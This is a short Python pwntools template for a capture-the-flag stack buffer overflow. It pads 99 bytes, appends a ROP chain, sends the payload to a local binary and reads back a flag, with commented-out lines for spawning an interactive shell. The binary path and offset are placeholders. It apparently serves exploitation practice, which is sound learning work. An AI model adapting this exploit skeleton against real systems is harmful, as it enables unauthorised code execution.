#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.binary = elf = ELF("./")     # Set context and load binary
io = process()      # Start the binary in a process

rop = ROP(elf)      # Create ROP object

# rop.system(0x01, 0x02)       # Call functions and provide their arguments

# Print out the ropchain to be used
print("ROP Dump:")
print(rop.dump())
print("ROP Chain:")
print(rop.chain())

offset = 99     # offset to the EIP/RIP

payload = b""
payload += b"A" * offset
payload += rop.chain()

io.recvuntil(b"> ")
io.sendline(payload)

# Got a flag?
io.recvuntil(b"Thank you!\n")
flag = io.recv()
success(str(flag))

# Got a shell?
# io.recv()
# io.interactive()
